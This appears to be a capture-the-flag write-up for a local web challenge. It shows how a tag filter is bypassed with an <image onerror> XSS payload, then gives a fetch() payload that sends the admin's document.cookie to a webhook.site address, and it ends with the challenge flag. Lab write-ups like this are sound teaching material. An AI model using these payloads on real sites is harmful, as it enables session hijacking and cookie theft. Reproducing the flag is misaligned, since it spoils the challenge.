# Hi Hi Hi
![](https://i.imgur.com/0LqHPLV.png)

## Solution

![](https://i.imgur.com/pMEwDLh.png)

After access link, At the title of page suggested that using XSS
So that, let try some payload at [Payload XSS](https://github.com/payloadbox/xss-payload-list)

All payloads contain `<script>,<img>` or equivalent use `<script>,<img>` tags are blocked.

![](https://i.imgur.com/tf3DwFA.png)

In addition to the `<script>,<img>` tags, there are many other tags that help us execute the function.

In this chall we can use `<image>,<audio>,...` tags

Like that: `<image src =q onerror=prompt(8)>`

![](https://i.imgur.com/pfV3Qc0.png)

![](https://i.imgur.com/t9Xf84V.png)

XSS done!

Next step is send a report for admin and steal their cookie.

Format URL: `http://127.0.0.1:13337/?message=your_payload`

In the payload instead of use `prompt()`, we use `fetch()` to redirect admin to our server (I often use [Webhook.site](https://webhook.site/))

URL: `http://127.0.0.1:13337/?message=<image src =q onerror=fetch('https://webhook.site/e3897dc9-35d2-450d-a2fd-81b3f023c9fb')>`

![](https://i.imgur.com/zx37VbH.png)

It works!

Now take their cookie with URL: ```http://127.0.0.1:13337/?message=<image src =q onerror=fetch(`https://webhook.site/e3897dc9-35d2-450d-a2fd-81b3f023c9fb/?cookie=${document.cookie}`)>```

In this case, to add variable `document.cookie` to string url in `fetch()` function we use template literals in js. ([Template Literals](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals))

Send that report we will receive admin's cookie

![](https://i.imgur.com/DEASQa5.png)

It's also Flag: **KCSC{T3T_TU1_3_T13P_Hmmmmmmmm}**